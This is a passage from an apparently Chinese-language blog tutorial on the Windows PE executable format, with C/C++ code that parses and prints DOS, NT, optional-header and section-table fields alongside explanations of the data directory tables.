20</span></span><br></pre></td></tr></tbody></table></figure><p>重点关注<code>Machine，NumberOfSections，SizeOfOptionalHeader和Characteristics</code>。</p><p>_IMAGE_FILE_HEADER.Machine的常用取值如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> lMAGE_FILE_MACHINE_1386         0x014c <span class="comment">// Intel 386</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lMAGE_FILE_MACHINE_IA64         0x0200 <span class="comment">// Intel 64</span></span></span><br></pre></td></tr></tbody></table></figure><p>_IMAGE_FILE_HEADER.Characteristics常用属性如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_RELOCS_STRIPPED0x0001 <span class="comment">// Relocation info stripped from file.没有重定位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 <span class="comment">// File is executable (i.e. no unresolved externel references).表示是可执行的</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 <span class="comment">// Line nunbers stripped from file.跳过行号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 <span class="comment">// Local symbols stripped from file跳过符号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_32BIT_MACHINE0x0100 <span class="comment">// 32 bit word machine是32位机器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_SYSTEM 0x1000 <span class="comment">// System File.是系统文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_FILE_DLL 0x2000 <span class="comment">// File is a DLL.是DLL文件</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="4-2-1-文件解析-实验"><a href="#4-2-1-文件解析-实验" class="headerlink" title="4.2.1 文件解析-实验"></a>4.2.1 文件解析-实验</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILENAME <span class="string">L"C:\\Users\\Misranduil\\Desktop\\demo.exe"</span></span></span><br><span class="line"><span class="comment">//解析DOS头</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintDosHdr</span><span class="params">(PIMAGE_DOS_HEADER pImgDosHdr)</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"IMAGE_DOS_HEADER:\r\n"</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    typedef struct _IMAGE_DOS_HEADER {</span></span><br><span class="line"><span class="comment">      WORD e_magic;</span></span><br><span class="line"><span class="comment">      WORD e_cblp;</span></span><br><span class="line"><span class="comment">      WORD e_cp;</span></span><br><span class="line"><span class="comment">      WORD e_crlc;</span></span><br><span class="line"><span class="comment">      WORD e_cparhdr;</span></span><br><span class="line"><span class="comment">      WORD e_minalloc;</span></span><br><span class="line"><span class="comment">      WORD e_maxalloc;</span></span><br><span class="line"><span class="comment">      WORD e_ss;</span></span><br><span class="line"><span class="comment">      WORD e_sp;</span></span><br><span class="line"><span class="comment">      WORD e_csum;</span></span><br><span class="line"><span class="comment">      WORD e_ip;</span></span><br><span class="line"><span class="comment">      WORD e_cs;</span></span><br><span class="line"><span class="comment">      WORD e_lfarlc;</span></span><br><span class="line"><span class="comment">      WORD e_ovno;</span></span><br><span class="line"><span class="comment">      WORD e_res[4];</span></span><br><span class="line"><span class="comment">      WORD e_oemid;</span></span><br><span class="line"><span class="comment">      WORD e_oeminfo;</span></span><br><span class="line"><span class="comment">      WORD e_res2[10];</span></span><br><span class="line"><span class="comment">      LONG e_lfanew;</span></span><br><span class="line"><span class="comment">    } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//逐个解析就好了，这里只解析e_magic 和 e_lfanew</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"e_magic:%04X(%c%c)\r\n"</span>, pImgDosHdr -&gt; e_magic, *(<span class="type">char</span>*)pImgDosHdr, *((<span class="type">char</span>*)pImgDosHdr + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"e_res[4]:"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X "</span>, pImgDosHdr -&gt; e_res[i]);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"e_lfanew:%08X\r\n"</span>, pImgDosHdr -&gt; e_lfanew);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//解析NT头</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintNtHdr</span><span class="params">(PIMAGE_NT_HEADERS pImgNtHdrs)</span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"IMAGE_NT_HEADERS:\r\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Signature:%08X(%s)\r\n"</span>, pImgNtHdrs -&gt; Signature, pImgNtHdrs);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// 打开文件 </span></span><br><span class="line">HANDLE hFile = CreateFile(FILENAME, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 创建文件内核映射对象 </span></span><br><span class="line">HANDLE hMap = CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 将文件映射入内存 </span></span><br><span class="line">LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER) lpBase;</span><br><span class="line">PIMAGE_NT_HEADERS32 pImgNtHdr = (PIMAGE_NT_HEADERS) ((DWORD)lpBase + (DWORD)pImgDosHdr -&gt; e_lfanew); </span><br><span class="line">PrintDosHdr(pImgDosHdr);</span><br><span class="line">PrintNtHdr(pImgNtHdr);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 释放文件映射 </span></span><br><span class="line">UnmapViewOfFile(lpBase);</span><br><span class="line"><span class="comment">// 光比文件内核映射对象 </span></span><br><span class="line">CloseHandle(hMap); </span><br><span class="line"><span class="comment">// 关闭文件 </span></span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20250113140224163.png" alt="image-20250113140224163"> </p><h2 id="4-3-可选头"><a href="#4-3-可选头" class="headerlink" title="4.3 可选头"></a>4.3 可选头</h2><p>可选头是IMAGE_OPTIONAL_HEADER，它是PE头部中重要的头部，虽然被称为可选头，但是并不是它说的可有可无，而是指<strong>该结构体中的部分数据在不同的文件中是不同的</strong>。</p><p>定义如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 32位头的大小是e0h, 224d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> {</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields. 标准字段 </span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic; <span class="comment">// 0x18 魔术字 107h = ROM Image 10Bh = EXE(32位) Image 20Bh = PE32+(64位) </span></span><br><span class="line">    BYTE    MajorLinkerVersion; <span class="comment">// 0x1A 连接器主版本号(对执行没有任何影响)</span></span><br><span class="line">    BYTE    MinorLinkerVersion; <span class="comment">// 0x1B 连接器次版本号(对执行没有任何影响)</span></span><br><span class="line">    DWORD   SizeOfCode; <span class="comment">// 0x1C 所有含代码的节的大小（按照文件对齐，判断某节是否含代码，使用节属性是否包含TNA</span></span><br><span class="line">    <span class="comment">// (GE_scu_cwr_coE属性判断，而不是通过IMAGE_sCN_CNT_EXECUTE)</span></span><br><span class="line">    DWORD   SizeOfInitializedData; <span class="comment">// 0x20 所有含有初始化数据的节的大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData; <span class="comment">// 0x24 所有含未初始化数据的节的大小(被定义为未初始化，不占用文件空间，加载入内存后为其分配空间)</span></span><br><span class="line">    DWORD   AddressOfEntryPoint; <span class="comment">// 0x28 程序执行入口RVA(距离PE加载后地址的距离，对于病毒和加密程序，都会修改该值，从而获得程序的控制权，对于DLL如果没有入口函数，那么是0，对于驱动该值是初始化的函数的地址)</span></span><br><span class="line">    DWORD   BaseOfCode; <span class="comment">// 0x2C 代码的节的起始RVA(一般情况下跟在PE头部的后面)</span></span><br><span class="line">    DWORD   BaseOfData; <span class="comment">// 0x30 数据的节的起始RVA </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields. NT系统增加的字段 </span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    DWORD   ImageBase; <span class="comment">// 0x34 程序的建议装载地址 （如果被占用了就不能装载在这个地方了）</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">// 0x38 内存中的节的对齐值 32位0x1000 64位0x2000</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">// 0x3C 文件中的节的对齐值 0x1000或者0x200</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion; <span class="comment">// 0x40 操作系统主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion; <span class="comment">// 0x42 操作系统次版本号</span></span><br><span class="line">    WORD    MajorImageVersion; <span class="comment">// 0x44 该PE的主版本号</span></span><br><span class="line">    WORD    MinorImageVersion; <span class="comment">// 0x46 该PE的次版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion; <span class="comment">// 0x48 所需子系统的主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion; <span class="comment">// 0x4A 所需子系统的次版本号</span></span><br><span class="line">    DWORD   Win32VersionValue; <span class="comment">//0x4C 未使用,必须为0</span></span><br><span class="line">    DWORD   SizeOfImage; <span class="comment">// 0x50 内存中的整个PE文件映像大小(按照内存对齐)</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">// 0x54 所有头+节表的大小</span></span><br><span class="line">    DWORD   CheckSum; <span class="comment">// 0x58 校验和(一般exe文件为0，而dll和sys文件则必须是正确的值)</span></span><br><span class="line">    WORD    Subsystem; <span class="comment">// 0x5C 文件子系统</span></span><br><span class="line">    WORD    DllCharacteristics; <span class="comment">// 0x5E DLL文件特性</span></span><br><span class="line">    DWORD   SizeOfStackReserve; <span class="comment">// 0x60 初始化时保留的栈大小(默认1M）</span></span><br><span class="line">    DWORD   SizeOfStackCommit; <span class="comment">// 0x64 初始化时实际提交的栈大小(默认4k)</span></span><br><span class="line">    DWORD   SizeOfHeapReserve; <span class="comment">// 0x68 初始化时保留的堆大小(默认1M）</span></span><br><span class="line">    DWORD   SizeOfHeapCommit; <span class="comment">// 0x6C 初始化时实际提交的堆大小(默认4K)</span></span><br><span class="line">    DWORD   LoaderFlags; <span class="comment">// 0x70 加载标志一般为0</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes; <span class="comment">// 0x74 数据目录的数效量（就是下面那个数组的大小）</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">// 0x78 数据目录数组</span></span><br><span class="line">} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></tbody></table></figure><ul><li>对齐：32位默认对齐值4K=4096=0x1000，64位默认8K。是内存分页的一个对齐值，大概意思就是比如：A班有50人，坐在一间教师里，B班只有两个人，但是也要坐在相同大的教室里。</li></ul><p>​</p><h3 id="4-3-1-示例程序查看可选头"><a href="#4-3-1-示例程序查看可选头" class="headerlink" title="4.3.1 示例程序查看可选头"></a>4.3.1 示例程序查看可选头</h3><p>由于之前的知识，我们知道<strong>00D0开始是PE头，长度为20字节</strong>，于是我们可以知道可选头即为红线外选中部分。</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241230214402168.png" alt="image-20241230214402168"></p><ul><li><p>Magic是0x010B，表示exe文件</p></li><li><p>要求最低的主版本号0x0e，辅版本号0x14</p></li><li><p>代码大小是0x00002200</p></li><li><p>包含的初始化数据大小是0x00001200</p></li><li><p>包含的未初始化数据大小是0</p></li><li><p>程序入口地址是0x00002030</p></li><li><p>代码起始地址是0x00001000</p></li><li><p>数据的起始地址是00001000</p></li><li><p>建议装载地址是00004000</p><p>……</p></li></ul><h1 id="5-数据目录表"><a href="#5-数据目录表" class="headerlink" title="5. 数据目录表"></a>5. 数据目录表</h1><h2 id="5-0-省流复习"><a href="#5-0-省流复习" class="headerlink" title="5.0 省流复习"></a>5.0 省流复习</h2><p>可选头（拓展PE头）最后一个成员的<br><strong>第一个 结构体是 导出表</strong>  40+字节大小（多了三个子表-名称表、地址表、序号表），导出表只有一张<br><strong>第二个 结构体是 导入表</strong>  20字节大小（）导入表有很多张<br>      导入表<strong>第一个成员是INT、第4个成员是模块名字（DLL名字）、第五个成员是IAT</strong></p><p>​      INT和IAT，PE文件加载前内容相同，加载后IAT发生变化，其中直接存储了函数地址</p><p>注：那么为什么不只留一张表呢？  IAT会变化<br>       这是因为IAT的函数地址很有可能会被修改掉，导致地址不正确，如果你只有一张表，就没有一个正确的参照物了。</p><p><strong>第六个 结构体是 重定位表</strong></p><blockquote><p>小知识：通过结构体的大小来判断结构/表的结束，例如导入表20字节大小，一个成员后面接着20个\x00，代表导入表结束</p></blockquote><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20250113154052860.png" alt="image-20250113154052860"> </p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20250113154124865.png" alt="image-20250113154124865"> </p><p>同样包含一大坨，<strong>导入表、导出表</strong>和<strong>重定位表</strong>较为重要。</p><p>![<img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/%E6%95%B0%E6%8D%AE%E7%9B%AE%E5%BD%95%E8%A1%A81.png" alt="imasfdasg">]</p><h2 id="5-1-导出表"><a href="#5-1-导出表" class="headerlink" title="5.1 导出表"></a>5.1 导出表</h2><p>导出表是用来描述模块(.dll)中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过GetProcAddress()函数就能动态获取到函数的地址。<br>函数导出的方式有两种：</p><ul><li>一种是按名字导出，</li><li>一种是按序号导出。</li></ul><p>这两种导出方式在导出表中的描述方式也不相同。</p><h2 id="5-2-导入表"><a href="#5-2-导入表" class="headerlink" title="5.2 导入表"></a>5.2 导入表</h2><p>导入表在PE文件加载时，会根据这个表里的内容加载依赖的模块(.dll)，并填充所需函数的地址。</p><h2 id="5-3-重定位表"><a href="#5-3-重定位表" class="headerlink" title="5.3 重定位表"></a>5.3 重定位表</h2><p>为了解决像call这样的使用VA的代码，在模块基址发生变化时还能准确定位而产生的表。步骤如下：</p><ol><li>编译的时候由编译器识别出哪些项使用了模块内的直接VA，比如push、一个全局变量、函数地址，这些指令的操作数在模块加载的时候就需要被重定位。</li><li>链接器生成PE文件的时候将编译器识别的重定位的项纪录在一张表里，这张表就是重定位表，保存在 DataDirectory中，序号是IMAGE_DIRECTORY_ENTRY_BASERELOC。</li><li>PE文件加载时，PE加载器分析重定位表，将其中每一项按照现在的模块基址进行重定位。</li></ol><h1 id="6-节表解析与地址转换"><a href="#6-节表解析与地址转换" class="headerlink" title="6. 节表解析与地址转换"></a>6. 节表解析与地址转换</h1><p>在PE文件中经常会用到三种地址，分别是</p><ul><li>VA (Virtual Address): 虚拟地址</li><li>RVA (Relatvie Virtual Address)∶ 相对虚拟地址</li><li>FOA (File Offset Address): 文件偏移地址</li></ul><p>节表结构体如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Section header format.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//此处偏移是按照每个IMAGE_SECTION_HEADER开始的(大小为28h,40d)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME 8       <span class="comment">//（节的长度最长为8）</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> struct_IMAGE_SECTION_HEADER</span><br><span class="line">{</span><br><span class="line">BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 000h节名称</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DWORD PhysicalAddress;</span><br><span class="line">DWORD VirtualSize;               <span class="comment">// 0008h 节区的尺寸 </span></span><br><span class="line">}Misc;</span><br><span class="line">DWORD VirtualAddress;               <span class="comment">// 000ch 节区的起始RVA地址</span></span><br><span class="line">DWORD SizeOfRawData;                <span class="comment">// 0x10 在文件中对齐后的尺寸 </span></span><br><span class="line">    DWORD PointerToRawData;             <span class="comment">// 0x14 该节在文件中的起始偏移</span></span><br><span class="line">    DWORD PointerToRelocations;         <span class="comment">// 0x18 在OBJ文件中使用 </span></span><br><span class="line">    DWORD PointerToLinenumbers;         <span class="comment">// 0x1C 行号表的位置(调试用)</span></span><br><span class="line">    WORD NumberOfRelocations;           <span class="comment">// 0x20 在OBJ文件中使用 </span></span><br><span class="line">    WORD NumberOfLinenumbers;           <span class="comment">// 0x24 行号表中行号的数量 </span></span><br><span class="line">    DWORD Characteristics;              <span class="comment">// 0x28 节的属性 </span></span><br><span class="line">}IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER; </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SECTION_HEADER </span></span><br></pre></td></tr></tbody></table></figure><h2 id="6-1-用LordPE解析节表"><a href="#6-1-用LordPE解析节表" class="headerlink" title="6.1 用LordPE解析节表"></a>6.1 用LordPE解析节表</h2><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241231115137217.png" alt="image-20241231115137217"> </p><h2 id="6-2-解析节表-代码编写"><a href="#6-2-解析节表-代码编写" class="headerlink" title="6.2 解析节表-代码编写"></a>6.2 解析节表-代码编写</h2><p>节表解析整体思路是：</p><ul><li>(1)、先得到节数量 NumberOfSections</li><li>(2)、循环次数=节数量</li><li>(3)、依据节的结构体来解析每个节的数据</li><li>(4)、输出相应的数据显示到控制台中</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;IMAGE_SECTION_HEADER_2&gt; vsection_header;</span><br><span class="line"><span class="comment">//解析节表</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; IMAGE_NT_HREADERS_2.FileHeader.NumberOfSections; i++)</span><br><span class="line">{</span><br><span class="line">    IMAGE_SECTION_HEADER_2 aa;</span><br><span class="line">    <span class="built_in">fread</span>(&amp;aa, <span class="built_in">sizeof</span>(aa), <span class="number">1</span>, fp);</span><br><span class="line">    vsection_header.<span class="built_in">push_back</span>(aa);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//打印节中的数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------------节表数据----------------\n"</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">"节数量:"</span> &lt;&lt; IMAGE_NT_HREADERS_2.FileHeader.NumberOfSections &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; IMAGE_NT_HREADERS_2.FileHeader.NumberOfSections; i++)</span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"--&gt; %s段信息 &lt;--\n"</span>, vsection_header[i].Name);</span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*[内存中段大小]:0x%x\n"</span>, vsection_header[i].Misc.VirtualSize);</span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_BLUE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*[内存中偏移]:0x%x\n"</span>, vsection_header[i].VirtualAddress);</span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*[文件中段大小]:0x%x\n"</span>, vsection_header[i].SizeOfRawData);</span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_BLUE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*[文件中偏移]:0x%x\n"</span>, vsection_header[i].PointerToRawData);</span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[OBJ重定位偏移]:0x%x\n"</span>, vsection_header[i].PointerToRelocations);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[OBJ重定位项数目]:0x%x\n"</span>, vsection_header[i].NumberOfRelocations);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[行号表偏移]:0x%x\n"</span>, vsection_header[i].PointerToLinenumbers);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[行号表中的数目]:0x%x\n"</span>, vsection_header[i].NumberOfLinenumbers);</span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"*[标志|属性]:0x%x "</span>, vsection_header[i].Characteristics);</span><br><span class="line">    <span class="comment">//区段的属性</span></span><br><span class="line">    DWORD l_Charctieristics = (BYTE)((DWORD)(vsection_header[i].Characteristics) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    DWORD h_Charctieristics = (BYTE)(((DWORD)(vsection_header[i].Characteristics) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line">    vector&lt;byte&gt; l_flag;</span><br><span class="line">    vector&lt;byte&gt; h_flag;</span><br><span class="line">    <span class="comment">//低位</span></span><br><span class="line">    l_flag.<span class="built_in">push_back</span>((l_Charctieristics &gt;&gt; <span class="number">7</span>) ? <span class="number">3</span> : <span class="number">0</span>);</span><br><span class="line">    l_flag.<span class="built_in">push_back</span>((l_Charctieristics &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span> ? <span class="number">2</span> : <span 